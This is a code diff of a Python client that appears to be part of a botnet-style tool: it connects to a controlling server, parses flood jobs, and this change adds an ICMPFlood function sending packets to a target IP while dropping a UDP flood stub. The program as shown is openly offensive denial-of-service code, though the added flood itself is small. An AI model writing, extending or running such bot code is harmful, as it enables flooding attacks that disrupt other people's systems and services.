@@ -12,7 +12,6 @@
 # ONE-TO-MANY
 # 1) execute an ICMP flood attack against a given IP or subnet
 # 2) execute a TCP flood attack against an IP or port
-# 3) UDP flood attack on IP/Port
 
 import socket  # socket object will be used to make the connection
 #from scapy.all import ARP, Ether, srp
@@ -78,6 +77,10 @@ def jobHandler(string):
         target_ip = parseFloodIP(string)
         port_num = int(parseFloodPort(string))
         jobRes = TCPFlood(target_ip, port_num)
+        return jobRes
+    else:  # ICMP Flood
+        target_ip = parseFloodIP(string)
+        jobRes = ICMPFlood(target_ip)
         return jobRes
 
 
@@ -192,7 +195,11 @@ def TCPFlood(target_ip, port_num):
     return f"Successfully Flooded IP Address {target_ip} At Port Number {port_num}"
 
 
-# def UDPFlood(target_ip, port_num):
+def ICMPFlood(target_ip):
+    for x in range(0, 10):
+        send(IP(dst=target_ip)/ICMP())
+
+    return f"I have flooded {target_ip} with 10 ICMP Packets!"
 
 
 sendMsgToServer(GREETING_MSG)  # first message to send
